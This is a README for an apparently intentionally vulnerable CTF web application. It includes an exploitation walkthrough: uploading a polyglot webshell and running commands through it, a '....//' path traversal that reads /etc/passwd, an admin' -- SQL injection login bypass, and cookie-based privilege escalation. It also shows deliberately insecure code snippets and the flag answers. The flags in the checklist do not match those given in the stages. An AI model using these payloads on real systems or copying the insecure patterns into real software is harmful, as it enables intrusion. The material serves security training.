# 🎯 Advanced CTF Challenge: File Upload Mayhem

A sophisticated web security challenge demonstrating multiple real-world vulnerabilities across different exploitation stages. This is a **Medium-Hard** difficulty CTF designed for security researchers, pentesters, and students learning offensive security.

## 📋 Project Overview

This application intentionally contains **5 major vulnerability categories** with realistic exploitation paths:

### Vulnerability Categories

| # | Category | Type | Impact | Flag |
|---|----------|------|--------|------|
| 1 | Information Disclosure | CWE-200 | Credential/Config Leak | 
| 2 | File Upload Bypass | CWE-434 | Remote Code Execution | 
| 3 | Path Traversal + SSTI | CWE-22 + CWE-1336 | Arbitrary File Read/Execute |
| 4 | SQL Injection | CWE-89 | Database Compromise | 
| 5 | Privilege Escalation | CWE-269 | System Compromis

## 🚀 Quick Start

### Installation

```bash
# Install dependencies
pip install -r requirements.txt

# Run the application
python app.py
```

The application will start at `http://localhost:5000`

### Default Credentials

```
admin / admin1234
user1 / password1
user2 / 1234567
```

## 🔓 Exploitation Guide

### Stage 1: Information Disclosure

**Endpoints:**
- `/robots.txt` - Hidden paths
- `/backup` - Backup directory
- `/backup/app.py.bak` - Source code
- `/backup/config.txt` - Credentials

**Flag:** `flag{info_disclosure_vuln}`

### Stage 2: File Upload Bypass

Generate polyglot files:
```bash
python tools/polyglot.py ./static/uploads
```

Upload and execute:
```bash
curl -F "file=@shell.jpg" http://localhost:5000/upload
curl "http://localhost:5000/static/uploads/shell.jpg?cmd=id"
```

**Flag:** `flag{polyglot_executed}`

### Stage 3: Path Traversal + SSTI

```bash
# Access file with path traversal
curl "http://localhost:5000/view?file=....//../etc/passwd"
```

**Flag:** `flag{path_traversal_ssti}`

### Stage 4: SQL Injection

Login as: `admin' --`

**Flag:** `flag{sql_injection}`

### Stage 5: Privilege Escalation

Set admin cookie:
```bash
curl -b "admin=true" http://localhost:5000/admin/system-info
curl -b "admin=true" http://localhost:5000/admin/readflag
```

**Flag:** `flag{privilege_escalation_suid_binary_executed}`

## 📁 Project Structure

```
webhack/
├── app.py
├── requirements.txt
├── templates/
│   ├── login.html
│   ├── dashboard.html
│   ├── upload.html
│   └── register.html
├── static/uploads/
├── logs/
├── tools/
│   └── polyglot.py
├── bin/
│   └── readflag.c
├── README.md
└── SOLUTION.md
```

## 🎓 Learning Objectives

- File upload validation bypass
- Polyglot file creation
- Path traversal exploitation
- Server-Side Template Injection
- SQL injection techniques
- Privilege escalation methods
- Race condition exploitation

## ⚙️ Vulnerable Code Examples

### SQL Injection (app.py line ~150)
```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
c.execute(query)
```

### Path Traversal (app.py line ~280)
```python
safe_filename = filename.replace('../', '')  # Only removes once!
```

### Weak Session Security (app.py line ~44)
```python
app.config['SESSION_USE_SIGNER'] = False  # No session signing
```

### File Upload (app.py line ~250)
```python
upload_path = os.path.join(app.config['UPLOAD_FOLDER'], safe_filename)
with open(upload_path, 'wb') as f:
    f.write(processed_data)
```

## 📊 Expected Timeline

| Stage | Time | Difficulty |
|-------|------|-----------|
| 1. Info Disclosure | 5 min | Easy |
| 2. File Upload Bypass | 10 min | Easy |
| 3. Path Traversal + SSTI | 15 min | Medium |
| 4. SQL Injection | 5 min | Easy |
| 5. Privilege Escalation | 20 min | Medium |
| **Total** | **55 min** | **Medium-Hard** |

## ✅ Flags Checklist

```
☐ flag{info_disclosure_vulnerability}
☐ flag{polyglot_file_executed}
☐ flag{path_traversal_ssti_rce}
☐ flag{sql_injection_bypass}
☐ flag{privilege_escalation_suid_binary_executed}
```

## 📚 References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [File Upload Security](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SSTI](https://owasp.org/www-community/attacks/Server-Side_Template_Injection_(SSTI))

## ⚠️ Disclaimer

**Educational purposes only.** Do not deploy in production. Do not use for unauthorized testing. This application demonstrates intentional vulnerabilities for learning.

---

**Difficulty:** Medium-Hard | **Flags:** 5 | **Time:** ~1 hour | **Status:** Ready for CTF
